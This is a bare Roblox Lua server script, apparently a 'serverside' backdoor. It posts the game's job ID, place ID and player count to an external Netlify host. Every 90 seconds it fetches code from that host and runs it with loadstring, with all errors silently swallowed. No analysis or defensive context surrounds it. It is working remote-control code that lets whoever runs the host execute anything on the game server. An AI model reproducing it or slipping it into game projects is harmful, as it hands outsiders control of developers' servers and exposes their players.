local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local BASE_URL = "https://rbx-serverside.netlify.app" 
local PING_URL = BASE_URL .. "/api/ping"
local GET_SCRIPT_URL = BASE_URL .. "/api/get-script"

local jobId = game.JobId
local placeId = game.PlaceId

local function pingServer()
    local success, _ = pcall(function()
        local playerCount = #Players:GetPlayers()
        local payload = {
            jobId = jobId,
            placeId = tostring(placeId),
            players = playerCount
        }
        HttpService:PostAsync(PING_URL, HttpService:JSONEncode(payload))
    end)
end

local function getAndRunScript()
    local success, response = pcall(function()
        return HttpService:GetAsync(GET_SCRIPT_URL .. "?jobId=" .. jobId)
    end)

    if success and response then
        local success2, decoded = pcall(function()
            return HttpService:JSONDecode(response)
        end)
        if success2 and decoded and decoded.script then
            local success3, _ = pcall(function()
                loadstring(decoded.script)()
            end)
        end
    end
end

while true do
    pcall(pingServer)
    pcall(getAndRunScript)
    wait(90)
end
